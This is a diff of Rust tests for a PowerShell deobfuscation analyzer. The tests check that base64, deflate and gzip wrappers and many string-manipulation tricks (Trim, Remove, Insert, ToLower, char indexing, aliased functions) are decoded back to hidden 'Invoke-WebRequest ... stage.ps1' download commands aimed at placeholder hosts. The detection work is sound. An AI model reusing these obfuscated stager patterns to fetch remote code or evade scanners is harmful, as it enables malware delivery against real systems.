+Clean '   {decoded}   '"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-trim-noarg-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal no-arg trim extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_trim_no_arg_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-trim-noarg-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($unused,$value) {{
+  return $value.Trim()
+}}
+Clean 0 '   {decoded}   '"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-trim-noarg-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered no-arg trim extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_param_block_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}}
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-param-block-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal param-block extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_new_item_function_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(New-Item -Path function: -Name Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-new-item-function-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal New-Item function extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_quoted_call_operator_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-quoted-call-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return $value.Trim($chars)
+}}
+& 'Clean' '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-quoted-call-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal quoted call-operator extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_variable_call_operator_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-variable-call-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"$fn = 'Clean'
+function Clean($value,$chars) {{
+  return $value.Trim($chars)
+}}
+& $fn '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-variable-call-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal variable call-operator extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_index_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-index-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value,$index) {{
+  return $value[$index]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-index-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_index_extractor_calls_with_dummy_arg_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 0 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-index-dummy-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($unused,$value,$index) {{
+  return $value[$index]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-index-dummy-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal index extractor calls with dummy args were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(decoded),
+            "literal index extractor dummy-arg output was not retained:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_chars_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-chars-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value,$index) {{
+  return $value.Chars($index)
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-chars-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal Chars extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_get_chars_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-get-chars-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value,$index) {{
+  return $value.get_Chars($index)
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-get-chars-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal get_Chars extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_tochararray_index_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-tochararray-index-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value,$index) {{
+  return $value.ToCharArray()[$index]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-tochararray-index-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal ToCharArray index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_index_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}')"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-index-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value) {{
+  return $value[1]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-index-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_chars_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}')"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-chars-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value) {{
+  return $value.get_Chars(1)
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-chars-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant Chars/get_Chars extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_tochararray_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}')"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-const-tochararray-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value) {{
+  return $value.ToCharArray()[1]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-tochararray-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant ToCharArray index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_case_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1";
+        let inner = r#"function Lower($value) {
+  return $value.ToLower()
+}
+Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-lower-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal string-case extractor call was not recursively decoded from {decoded}: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_string_case_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "invoke-webrequest -uri https://ps-reordered-lower-extractor.example/stage.ps1";
+        let inner = r#"function Lower($unused,$value) {
+  return $value.ToLower()
+}
+Lower 0 'INVOKE-WEBREQUEST -URI HTTPS://PS-REORDERED-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-lower-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered string-case extractor call was not recursively decoded from {decoded}: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_tail_substring_extractor_call() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1";
+        let ps = format!(
+            r#"function Tail($value,$start) {{
+  return $value.Substring($start)
+}}
+Tail 'zz{decoded}' 2"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains(
+                "'Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1'"
+            ),
+            "literal tail substring extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_remove_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-remove-extractor.example/stage.ps1";
+        let ps = r#"function Cut($value,$start,$count) {
+  return $value.Remove($start,$count)
+}
+Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7 4"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal remove extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_remove_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-remove-extractor.example/stage.ps1";
+        let inner = r#"function Cut($unused,$value,$start,$count) {
+  return $value.Remove($start,$count)
+}
+Cut 0 'Invoke-JUNKWebRequest -Uri https://ps-reordered-remove-extractor.example/stage.ps1' 7 4"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-remove-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered remove extractor call was not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+        assert!(report.deobfuscated.contains(decoded));
+    }
+
+    #[test]
+    fn ps1_literal_constant_remove_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-remove-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Cut($value) {{
+  return $value.Remove(0,2)
+}}
+Cut 'xx{decoded}'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-remove-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant remove extractor call was not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_tail_remove_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-tail-remove-extractor.example/stage.ps1";
+        let start = decoded.len();
+        let ps = format!(
+            r#"function CutTail($value,$start) {{
+  return $value.Remove($start)
+}}
+CutTail '{decoded}JUNK' {start}"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal tail remove extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_insert_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-insert-extractor.example/stage.ps1";
+        let ps = r#"function Add($value,$start,$text) {
+  return $value.Insert($start,$text)
+}
+Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal insert extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_insert_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-insert-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Add($unused,$value,$start,$text) {{
+  return $value.Insert($start,$text)
+}}
+Add 0 '{}' 6 '-'"#,
+            decoded.replace("Invoke-", "Invoke")
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-insert-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered insert extractor call was not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_insert_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-insert-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Add($value) {{
+  return $value.Insert(6,'-')
+}}
+Add '{}'"#,
+            decoded.replace("Invoke-", "Invoke")
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-insert-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant insert extractor call was not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_string_case_extractor_call() {
+        let ps = r#"function Lower($value) {
+  return $value.ToLower()
+}
+Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized
+                .contains("'invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1'"),
+            "literal string-case extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_literal_new_item_function_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(New-Item Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-new-item-path-function-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal New-Item path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_new_item_alias_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(n`i Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-ni-path-function-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal New-Item alias path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_set_item_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(Set-Item Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-set-item-path-function-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal Set-Item path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_set_item_alias_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-si-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(s`i Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-si-path-function-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal Set-Item alias path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_parenthesized_receiver_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-paren-receiver-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return ($value).Trim($chars)
+}}
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-paren-receiver-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal parenthesized-receiver extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
         );
     }
 
@@ -7863,6 +18170,112 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_nested_deflate_base64() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded = "Invoke-WebRequest -Uri https://deflate-stream.example/stage.ps1";
+        let mut encoder =
+            flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let deflated = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(deflated);
+        let ps = format!(
+            "$s.Arguments='-nop -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''{b64}''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://deflate-stream.example/stage.ps1"),
+            "nested deflate payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.to_ascii_lowercase().contains("deflatestream"),
+            "deflate wrapper should be replaced by the decoded script:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_variable_gzip_function_base64() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let filler: String = (0..1024).map(|n| format!("{n:04x}")).collect();
+        let decoded =
+            format!("Invoke-WebRequest -Uri https://gzip-func.example/stage.ps1\r\n# {filler}");
